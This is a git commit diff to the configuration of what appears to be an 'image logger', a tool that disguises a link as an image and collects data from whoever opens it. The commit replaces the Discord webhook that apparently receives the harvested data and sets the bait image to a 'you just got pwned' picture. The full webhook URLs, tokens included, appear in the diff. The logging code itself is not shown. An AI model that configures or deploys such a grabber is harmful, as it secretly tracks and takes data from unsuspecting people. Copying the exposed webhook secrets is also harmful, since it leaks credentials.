d128491e72982f4136e940374da2fe6ca0e6ebe8
Dog <matei.pahumi123@gmail.com>
2026-06-13 18:28:58 +0300

    Update image.py

--- api/image.py
+++ api/image.py
@@ -9,8 +9,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1515377080886624276/4RfCGHGQU4DCPkY8b1-b-Abd0LpzUKz9JTAXvfXTltCZP9z8eMwFb2Ixzw6ZXOAGeffP",
+    "image": "https://juststickers.in/wp-content/uploads/2020/12/you-just-got-pwned.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
